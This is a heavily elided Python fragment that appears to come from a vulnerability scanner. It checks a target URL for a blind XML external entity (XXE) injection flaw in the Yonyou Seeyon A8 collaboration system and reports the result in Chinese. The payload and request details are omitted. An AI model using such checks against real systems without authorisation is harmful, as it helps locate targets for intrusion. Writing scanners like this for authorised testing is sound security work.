...
class yonyou_a8_personService_xxe:
    ...
    def run(self):
        ...
        try:
            ...
            if md5_str in reqr.text:
                printGreen("[+]Success:存在用友致远A8协同系统 Blind XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
            else:
                printBlue("[-]Info:不存在yonyou_a8_personService_xxe漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = yonyou_a8_personService_xxe(sys.argv[1])
    testVuln.run()
